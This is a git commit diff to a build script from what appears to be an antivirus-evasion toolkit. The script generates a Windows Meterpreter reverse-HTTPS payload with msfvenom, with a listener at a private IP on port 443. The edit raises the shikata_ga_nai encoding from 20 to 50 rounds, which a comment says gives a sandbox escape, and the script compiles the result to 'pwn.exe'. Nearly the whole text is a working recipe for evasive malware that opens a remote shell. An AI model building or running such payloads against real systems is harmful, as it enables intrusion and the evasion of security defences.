59e55c18b311f76650494e458ce28ca860436444
Daniel Sauder <daniel.sauder@web.de>
2017-06-12 01:27:57 +0200

    update

--- build/build_win32_meterpreter_rev_https_50xshikata.sh
+++ build/build_win32_meterpreter_rev_https_50xshikata.sh
@@ -5,7 +5,7 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > sc.txt
 # call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
 ./make_avet -f sc.txt
 # compile to pwn.exe file
